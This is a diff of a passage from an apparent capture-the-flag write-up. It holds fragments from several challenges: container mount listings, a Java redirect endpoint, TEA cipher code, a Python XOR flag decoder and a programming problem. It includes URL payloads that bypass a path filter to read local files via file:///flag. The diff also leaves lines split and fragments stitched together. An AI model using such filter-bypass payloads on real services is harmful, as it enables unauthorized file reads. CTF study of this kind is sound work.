@@ -10,11 +10,6 @@ admin@chamd5.org(带上简历和想加入的小组
 
 ```
 const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
-```
-
-
-
-```
 /usr/local/lib/node_modules/npm/node_modules/tar/lib/get-write-flag.js
 /usr/local/lib/node_modules/npm/node_modules/@colors/colors/lib/system/has-flag.js
 /usr/local/lib/node_modules/npm/node_modules/@npmcli/arborist/lib/calc-dep-flags.js
@@ -30,11 +25,6 @@ const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
 /proc/sys/kernel/sched_domain/cpu0/domain0/flags
 /proc/sys/kernel/sched_domain/cpu1/domain0/flags
 /proc/kpageflags
-```
-
-
-
-```
 overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/HQEJT3S2NCMCVKGHH4SF3RDVMA:/var/lib/docker/overlay2/l/6KYM5WPXYKTWZWALJBOVWBUEVZ:/var/lib/docker/overlay2/l/OXENVSFPHLOFB2X2HUH62P74JQ:/var/lib/docker/overlay2/l/ZPW4OHQ6XGZQRWP4SBGWSWYIAM:/var/lib/docker/overlay2/l/AHHJVJDTXW3SM5ZVQ6EVC6RCOY,upperdir=/var/lib/docker/overlay2/514c0d3ab08f9e3ac0044a6a12f363f91f2dca87cef7d29ae2af8d3e4cbf56ea/diff,workdir=/var/lib/docker/overlay2/514c0d3ab08f9e3ac0044a6a12f363f91f2dca87cef7d29ae2af8d3e4cbf56ea/work 0 0
 proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
 tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
@@ -67,28 +57,13 @@ tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
 tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
 tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
 tmpfs /sys/firmware tmpfs ro,relatime 0 0
-```
-
-
-
-```
 const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
-```
-
-
-
-```
 if (!request.getRequestURI().equals("/private") && !request.getRequestURI().equals("/test")) {
    return true;
 } else {
    response.setStatus(418);
    return false;
 }
-```
-
-
-
-```
 @GetMapping({"/test"})
 public String test(@RequestParam(name="redirect",required = true) String redirect) {
    String url = (String)CacheMap.getInstance().get(redirect);
@@ -104,18 +79,9 @@ public String test(@RequestParam(name="redirect",required = true) String r
             return "url is invalid";
          }
       }
-```
-
-
-
-```
-http://localhost:8080/private/?url=http://www.example.com&url=file:/
+http://localhost:
+8080/private/?url=http://www.example.com&url=file:/
 //flag
-```
-
-
-
-```
 private static final Pattern URI_PATTERN = Pattern.compile("^(([^:/?#]+):)?(//(([^@\[/?#]*)@)?(\[[\p{XDigit}:.]*[%\p{Alnum}]*]|[^\[/?#:]*)(:(\{[^}]+\}?|[^/?#]*))?)?([^?#]*)(\?([^#]*))?(#(.*))?");
 Assert.notNull(uri, "URI must not be null");
 Matcher matcher = URI_PATTERN.matcher(uri);
@@ -136,30 +102,16 @@ if (matcher.matches()) {
             opaque = true;
         }
     }
-```
-
-
-
-```
-http://localhost:8080/private/?%75%72%6c=file:///flag
-```
-
-
-
-```
-#include <tchar.h>
-#include <stdio.h>
-#include <windows.h>
-#include <wincrypt.h>
-#include <conio.h>
-#include <iostream>
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdint.h>
+http://localhost:
+8080/private/?%75%72%6c=file:///flag
+    #include <tchar.h>
+    #include <stdio.h>
+    #include <windows.h>
+    #include <wincrypt.h>
+    #include <conio.h>
+    #include 
+    #include <stdio.h>
+    #include <stdint.h>
 void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4])
 {
     unsigned int i;
@@ -171,22 +123,12 @@ void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key
     }
     v[0] = v0; v[1] = v1;
 }
-```
-
-
-
-```
 s = 'JFYvMVU5QDoNQjomJlBULSQaCihTAFY='
 s = [0x24,0x56,0x2f,0x31,0x55,0x39 ,0x40 ,0x3a ,0x0d ,0x42 ,0x3a ,0x26 ,0x26 ,0x50 ,0x54 ,0x2d ,0x24 ,0x1a ,0x0a ,0x28 ,0x53 ,0x00 ,0x56]
 t = "secret"
 for i in range(len(s)):
     print(chr((s[i])^ord(t[i%len(t)])),end="")
 #W3LC0M3_n0_RU57_AnyM0r3
-```
-
-
-
-```
 Problem Description:
 Dr. Dai raises many Pals for his scientific research. As Dr. Dai is a loving person, he prepares food for these Pals every day.
 Now we have $a$ Pals that only love to eat meat, $b$ Pals that absolutely do not eat meat, and $c$ Pals that eat anything.
